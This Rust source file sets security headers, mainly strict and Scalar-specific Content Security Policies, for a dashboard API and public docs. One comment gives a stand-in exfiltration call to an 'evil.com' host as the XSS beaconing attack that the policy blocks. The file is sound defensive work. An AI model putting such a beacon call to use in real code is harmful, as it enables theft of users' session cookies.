//! Security headers para rutas que un browser autenticado puede consumir.
//!
//! Aplicamos un set defensivo estándar al dashboard JSON API + healthz + docs públicas.
//! NO los aplicamos a `/api/v1/ingest` porque los SDKs ingestan desde environments
//! arbitrarios (Node, browser, mobile, gateways) y los headers son bytes desperdiciados
//! sin valor defensivo allí.
//!
//! Las layers se aplican POR FUERA del middleware de auth, así las respuestas 401
//! generadas por `require_session_mw` también las llevan.

use axum::http::header::{
    CONTENT_SECURITY_POLICY, REFERRER_POLICY, STRICT_TRANSPORT_SECURITY, X_CONTENT_TYPE_OPTIONS,
    X_FRAME_OPTIONS,
};
use axum::http::HeaderValue;
use axum::Router;
use tower_http::set_header::SetResponseHeaderLayer;

use crate::state::SharedState;

/// CSP para la JSON API del dashboard. Estricto:
///   - `script-src 'self'` — no inline ni eval; un XSS no puede inyectar `<script>...</script>`.
///   - `connect-src 'self'` — un XSS no puede exfiltrar a `fetch('https://evil.com', ...)`.
///     Esta línea es la que cierra el vector de cookie-stealing por beaconing.
///   - `frame-ancestors 'none'` — anti-clickjacking (moderno, complementa X-Frame-Options).
///   - `style-src 'self' 'unsafe-inline'` — concesión razonable para CSS-in-JS / Tailwind.
const STRICT_CSP: &str = "default-src 'self'; \
     script-src 'self'; \
     style-src 'self' 'unsafe-inline'; \
     img-src 'self' data: blob:; \
     font-src 'self' data:; \
     connect-src 'self'; \
     frame-ancestors 'none'; \
     base-uri 'self'; \
     form-action 'self'";

/// CSP para Scalar (la referencia API pública en `/docs`). Necesita:
///   - `script-src https://cdn.jsdelivr.net 'unsafe-inline'` — el bundle de
///     Scalar se carga del CDN de jsdelivr y bootea desde un `<script>` con
///     `data-url`; el bundle también evalúa código generado en runtime.
///   - `style-src 'unsafe-inline' https://cdn.jsdelivr.net` — Scalar inyecta
///     estilos dinámicos vía JS al montar la UI.
///   - `font-src https://fonts.scalar.com` — Scalar carga su tipografía
///     (Inter + mono variants) desde su CDN propio, NO desde jsdelivr.
///     Sin esto la UI cae a fuentes del sistema y pierde su look.
///   - `connect-src 'self'` — única conexión nuestra es a
///     `/api/v1/openapi.json` (same-origin). NO whitelisteamos
///     `api.scalar.com` (registry/marketplace de Scalar) a propósito —
///     nuestro docs no debe beaconear afuera. Esa feature degrada en
///     silencio sin afectar el render del spec.
/// El riesgo es acotado: `/docs` es público (no autenticado) y no maneja secretos.
const SCALAR_CSP: &str = "default-src 'self'; \
     script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; \
     style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; \
     img-src 'self' data: blob: https://cdn.jsdelivr.net; \
     font-src 'self' data: https://cdn.jsdelivr.net https://fonts.scalar.com; \
     connect-src 'self'; \
     frame-ancestors 'none'; \
     base-uri 'self'; \
     form-action 'self'";

const HSTS_VALUE: &str = "max-age=31536000; includeSubDomains";

/// Envuelve `router` con los security headers para el dashboard JSON API + healthz.
pub fn apply_dashboard_headers(
    router: Router<SharedState>,
    enable_hsts: bool,
) -> Router<SharedState> {
    apply_common(router, STRICT_CSP, enable_hsts)
}

/// Envuelve `router` con los security headers para las docs públicas (Scalar).
pub fn apply_docs_headers(router: Router<SharedState>, enable_hsts: bool) -> Router<SharedState> {
    apply_common(router, SCALAR_CSP, enable_hsts)
}

fn apply_common(
    router: Router<SharedState>,
    csp: &'static str,
    enable_hsts: bool,
) -> Router<SharedState> {
    let mut r = router
        .layer(SetResponseHeaderLayer::overriding(
            CONTENT_SECURITY_POLICY,
            HeaderValue::from_static(csp),
        ))
        .layer(SetResponseHeaderLayer::overriding(
            X_FRAME_OPTIONS,
            HeaderValue::from_static("DENY"),
        ))
        .layer(SetResponseHeaderLayer::overriding(
            X_CONTENT_TYPE_OPTIONS,
            HeaderValue::from_static("nosniff"),
        ))
        .layer(SetResponseHeaderLayer::overriding(
            REFERRER_POLICY,
            HeaderValue::from_static("strict-origin-when-cross-origin"),
        ));
    if enable_hsts {
        r = r.layer(SetResponseHeaderLayer::overriding(
            STRICT_TRANSPORT_SECURITY,
            HeaderValue::from_static(HSTS_VALUE),
        ));
    }
    r
}
